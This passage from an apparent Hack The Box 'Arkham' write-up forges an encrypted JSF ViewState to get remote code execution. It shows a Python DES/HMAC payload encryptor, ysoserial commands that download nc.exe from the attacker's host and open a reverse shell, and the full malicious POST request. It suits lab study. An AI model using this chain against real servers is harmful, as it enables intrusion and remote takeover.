&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;des&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ECB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pad&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;padmode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PAD_PKCS5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;enc_payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enc_payload&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hmac_sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;hmac_sig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmac&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enc_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sha1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;hmac_sig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmac_sig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmac_sig&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'JsF9876-'&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[!] Usage : {} [Payload File] [Output File]&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;rb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Encrypting payload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;  [!] Key : JsF9876-&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;enc_payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Creating HMAC signature&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;hmac_sig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmac_sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Appending signature to the encrypted payload&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc_payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmac_sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;quote_plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] Final payload : {}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;w&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] Saved to : {}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-script-has-two-functions-encrypt-and-hmac_sig-encrypt-takes-the-payload-generated-by-ysoserial-and-des-encrypts-it-using-the-key-then-returns-the-encrypted-payload-hmac_sig-takes-the-encrypted-payload-and-generates-the-hmac-signature-that-will-be-appended-to-the-encrypted-payload&quot;&gt;This script has two functions, &lt;code class=&quot;highlighter-rouge&quot;&gt;encrypt()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;hmac_sig()&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;encrypt()&lt;/code&gt; takes the payload generated by &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;DES&lt;/code&gt; encrypts it using the key then returns the encrypted payload. &lt;code class=&quot;highlighter-rouge&quot;&gt;hmac_sig()&lt;/code&gt; takes the encrypted payload and generates the &lt;code class=&quot;highlighter-rouge&quot;&gt;hmac&lt;/code&gt; signature that will be appended to the encrypted payload.&lt;/h4&gt;
&lt;h4 id=&quot;the-script-takes-two-arguments-first-one-is-for-the-filename-that-contains-the-ysoserial-generated-payload-it-encrypts-it-then-generates-the-hmac-signature-appends-it-to-the-encrypted-payload-base-64-encodes-the-final-payload-and-url-encodes-it-then-it-saves-the-payload-into-the-output-file-which-is-the-second-argument&quot;&gt;The script takes two arguments, first one is for the filename that contains the &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial&lt;/code&gt; generated payload, it encrypts it then generates the &lt;code class=&quot;highlighter-rouge&quot;&gt;hmac&lt;/code&gt; signature, appends it to the encrypted payload, base-64 encodes the final payload and &lt;code class=&quot;highlighter-rouge&quot;&gt;url&lt;/code&gt;-encodes it. Then it saves the payload into the output file which is the second argument.&lt;/h4&gt;
&lt;h4 id=&quot;time-to-use-ysoserial--we-run-into-the-problem-of-which-payload-to-use-i-used-commonscollections5-and-it-worked&quot;&gt;Time to use &lt;code class=&quot;highlighter-rouge&quot;&gt;ysoserial&lt;/code&gt;,  we run into the problem of which payload to use, I used &lt;code class=&quot;highlighter-rouge&quot;&gt;CommonsCollections5&lt;/code&gt; and it worked.&lt;/h4&gt;
&lt;h4 id=&quot;i-created-two-payloads-first-one-is-to-download-ncexe-from-my-box-and-save-it-in-cwindowssystem32spooldriverscolor-second-one-is-to-execute-the-reverse-shell-command--ncexe--e-cmdexe-1010xxxx-1337&quot;&gt;I created two payloads, first one is to download &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; from my box and save it in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\windows\system32\spool\drivers\color&lt;/code&gt;, second one is to execute the reverse shell command : &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe -e cmd.exe 10.10.xx.xx 1337&lt;/code&gt;&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham# java -jar ysoserial.jar CommonsCollections5 'cmd.exe /c powershell -c Invoke-WebRequest -Uri &quot;http://10.10.xx.xx/nc.exe&quot; -OutFile &quot;C:\windows\system32\spool\drivers\color\nc.exe&quot;' &amp;gt; uploadnc.payload
WARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections5 (file:/root/Desktop/HTB/boxes/arkham/ysoserial.jar) to field javax.management.BadAttributeValueExpException.val
WARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections5
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release
root@kali:~/Desktop/HTB/boxes/arkham# java -jar ysoserial.jar CommonsCollections5 'cmd.exe /c &quot;C:\windows\system32\spool\drivers\color\nc.exe&quot; -e cmd.exe 10.10.xx.xx 1337' &amp;gt; executenc.payload
WARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections5 (file:/root/Desktop/HTB/boxes/arkham/ysoserial.jar) to field javax.management.BadAttributeValueExpException.val
WARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections5
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release
root@kali:~/Desktop/HTB/boxes/arkham# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-encrypted-them-with-my-script-&quot;&gt;Then I encrypted them with my script :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-ran-a-python-server-to-host-ncexe-and-i-started-my-nc-listener-on-port-1337-then-i-sent-the-payloads&quot;&gt;I ran a python server to host &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; and I started my &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; listener on port 1337, then I sent the payloads.&lt;/h4&gt;
&lt;h4 id=&quot;1st-request-&quot;&gt;1st Request :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /userSubscribe.faces HTTP/1.1
Host: arkham.htb:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://arkham.htb:8080/userSubscribe.faces
Content-Type: application/x-www-form-urlencoded
Content-Length: 3197
Cookie: JSESSIONID=FFA2F263EA4D3BCCFAAEEFBE012A524D
Connection: close
Upgrade-Insecure-Requests: 1

j_id_jsp_1623871077_1%3Aemail=test&amp;amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;amp;javax.faces.ViewState=o4swGdxTZXw1mKtPxFkjUuWrKOBMVnhQ7RbMizpCb4xVYti30eaLecyiLLU7plNhjPFRnShy4IlIzxo0JHimBY3Uq1igjemgy0Ki4udfDHCBAJC2Yt%2BEq3hlEwGdEWrah3tqcdo5Gxzenm%2BTobetH0%2BaG8%2BiCEB1RbCm7b%2FRwuOINGcnD%2BFO3DfRKu9gMF%2Bhys2vYzpsGEyHK3knl7tEaywlBVCuHcXMqHLkcdxxT%2FxmSmtDFG85aQTVagEZSOEEX9bCEH73rYHKIdkiMmo3tRSv0aFcuTCzo9ywZEOE7bULbrBQyiDX34vkaoTgGwZx5xiJxcuYu0CBGPZRDq1UBGH1QEaZ391dmKFPiBhIqgml%2FErcnLpXhN2CNsbBu9HHKSuy0lTdaYJifqCf5zOXppnKQiTkInD9AN%2BIjrIKoKhLslblPlDOJTrY6IWKCYEH9ZL8tl0EWKQbiDEBanGkxqkFjjIIqXZFoV%2BTjkS1FnVO%2FoHWBB6y1rXJo3U1C5yWD2YmTWm4GDisEHwUAFbDTHvZSVfjA0tLKeDOxOM%2F8vhiJvs7XB%2FiL0xioZBCDhyyogM5ilMzKrxi25pKdV7qKFYgBIpi82HZJBiyt0w%2FfqlS6hjo07yHrHeKgVe5KiMmPRtt6h4buRWMlkPun2jgm259cO2loSVMSxjNu9%2FCCnMkGLK3TD9%2BqV2YP5mtCOlGyIG92TCIcaFw8tZsfH14qFQuvLXlje%2BWBoE1cgT2Ozo%2Bus8jmf0nBttP8g%2FGkIl6LoObMsC3BpXUjNHX%2Fl6ZpFrpHPYqF04R1vdMLtxFTMVOrQbaoakmK3uiTmx6KyVVK59aLaXuOysuH%2BsV3gx3v3PoFcpnc1%2BAJTHWKqHfCy1opEh7cDv2tdwg%2FTiZmJ7Y2965FPpV2Dw1mICArOvAOCf9fzZiZncI%2BCoX%2FOuaRilAYhWNKe8XzdQP6NjTNMEAoU8qpv%2FvNvILq22We0wQ1mUW3OrpauOZzU7%2BmQoL%2BGnNtOpmFx%2FzHz9CO1Qw3PfdQHYhQvw4tg%2FW90wu3EVMxVnQ5zD2tQV6GrCAJFCMnfi8x%2Bf6%2BnW9kb%2F3KJjeLP9EaVtnw4HgbxOvCM237bf506YkZewPgxQiLewUhIRMklMJnDnzAWGDt7FI7YRaUwB8JGXyetfsWfwktvElTU8G%2Fq7MLUp4%2BGPRDBvo6SMhFsfpnWDv02QaeNaSLMlE9boIJFbYlwyeLs9OWTCIP4cwrVmtcdeHaJalFuas%2BcLlmoyCpiYNGomoF2fGsKSBlO02H5aD7eIK4KEmO7jZE%2FsAoHMWWJfxo23t44S4ahSOeHfvlzJqhV2WT62diMizXDhDlWLlH5eRWvOufroUtk3jPS%2B%2F%2B6Ud4Bajai2yaRfDxHbTJgZ6IWsFXJmYIJXEh5ODaSShdwisWrLMFqobrL%2B3iOMkCTIPHpwTC4k4WjyVGoC3EmsS4trV68wenfb4asCPSZABGwnwfoqx6CHK%2BPGB13aRjo4KzHOVh7W5RxqOnjWWACJFXGhBny4XW4CootugK59aLaXuOyv6AM6KeF8cfH0GU8FiZ%2BF0wy6hHdRzv29OOgXpgJZaMjXVY9Qh34X7raWi1V1bOk3wI5mPW2oCG%2FHiPH0hgDaLJD%2F5rWumATBRhPfQdMukPUuvh7aBrYKhTjoF6YCWWjI11WPUId%2BF%2B62lotVdWzpNlg7XO%2BO71UXIulcb15uC4Uo%2FmVX%2BF55hhstnKpruvCRn1%2FE2U%2BSHSUwJwYQalMFkB3EYe3Bg0twUHB0FLdRlgk%2B1LfoOx%2BOAGABHbKLruPQnSgSaOr0QO7fs3ABDYpM%2B0brsRYoVq%2FxZrXHXh2iWpRbmrPnC5ZqMgqYmDRqJqBegTWtulqHIbfmX3cwmZtK73nCNfCh4bR8nU8ph%2B9dFQFQm3TB92LYOU%2Bo9ImRGT5ZxHsqO7r9vsYEY9lEOrVQEonBeV1772fxzAWY30P6lQjx7QKzqFpGw7VVu9x6xj4HqyzMw3srhBWpB1evb%2F2cj2VJfV2Ik%2Fe1XeDhxd98FCKdtuwD%2FhfhKKwyMHBLd%2B%2BTRSti5%2BPjgedH8VrYCDw%2Bh7TXbFuuzmic0Ejp%2FMdRQ2lgM7A1Zk2tN7LvOGYXm5vai2%2Fp9KNzcb82%2BWwUxFUNdG%2Fr%2B91Skv9JVChFgo1kBKZ5DSG9GVW0c93lwaDPZR8m2MdKuCGEIGysMjBwS3fvkWX6kL5w8G98g8evxDbfYkHzyF14jnr2kMvA1HZRyD2wcvsnF03HnathuuAfsXFi9nSS%2FwbSz1fz4k0TLI7Jwpbv6aAGFYU9IId4BaMaICpD4zmUdsKF%2FchdWUs7E65By387U2Ejeqn%2FY3UAanW9XVGnW1aWk9nG1iLSIviO15BJYS2423DKh2itxBdEkoL7a2k0YgPMLX%2BTweGj5FUR%2FlCPgQijAFFrHWRvjlEtsVNbr09Qek%2F0QE3yWXS1W%2FgaT%2B7VnbdN2xAhE%2B9N5PSzJudEi8q%2Fo29VPSGioyPZd%2FiNpmNoUDeaeXEVrvY0L%2FaRMkBoThhoybIwKm9JRORG5quVg7mI39K3ANZaw6BBLyJDVbXmOcpydaV%2BJ4ehZuDU5EJNCdYdlqpK5IUgV5VNtTWO9f9YgPaneg14o%2B53eYRjgAQvWxmK%2FVII6JP9zUlbTzD60JeAbleovB8fLJf0D3aUv3mla%2B%2FLyWEXo2NfiqjFqPb9b4NHR199UdBVp6X2nev37%2Ftu0vBXvZz%2Bls4886hDPhV3RdASjsJaoZPrEReF8f43oev%2Bx6ZHIUdkCdk5uThniTrXeAWImx1USbtujkG0xSYdfK%2Fs8Az9gV7hyTmqI0ewkaYsX9uSA%2F9wVoArXnRX%2FrTg7PxMp9hGNKQN%2Fklr%2BXyc%3D
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response-&quot;&gt;Response :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 500 
Content-Type: text/html;charset=utf-8
Content-Language: en
Content-Length: 2570
Date: Fri, 09 Aug 2019 18:36:52 GMT
Connection: close

&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;lang=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;HTTP Status 500 â Internal Server Error&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;style &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;h1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;22px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;h2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span 